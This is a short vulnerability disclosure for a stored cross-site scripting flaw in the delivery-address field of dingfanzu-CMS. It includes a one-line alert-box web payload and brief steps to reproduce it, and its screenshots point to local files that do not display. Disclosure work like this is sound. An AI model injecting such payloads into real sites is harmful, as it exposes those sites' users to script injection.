# dingfanzu-CMS order_confirm.html Delivery-Address Stored Cross-Site Scripting(XSS)

**Exploit Title: dingfanzu-CMS order_confirm.Delivery-Address Stored Cross-Site Scripting**

**Exploit Author: webraybtl@webray.com.cn inc**

**Vendor Homepage: https://github.com/geeeeeeeek/dingfanzu**

**Software Link: https://github.com/geeeeeeeek/dingfanzu**

**CMSName: dingfanzu-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.dingfanzu-CMS does not filter the content correctly at the Delivery-Address "username" module, resulting in the generation of stored XSS.

    Payload used:

```
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

## Proof of Concept

register a account

![](D:\software_data\markdown_image\2024-08-22-14-47-37-image.png)

![](D:\software_data\markdown_image\2024-08-22-14-47-59-image.png)

Write a user Delivery Address

change HTML Maxlength 

![](D:\software_data\markdown_image\2024-08-22-15-21-41-image.png)

XSS-Payload :  `<img src=x onerror=alert(String.fromCharCode(88,83,83));>`

![](D:\software_data\markdown_image\2024-08-22-15-15-51-image.png)
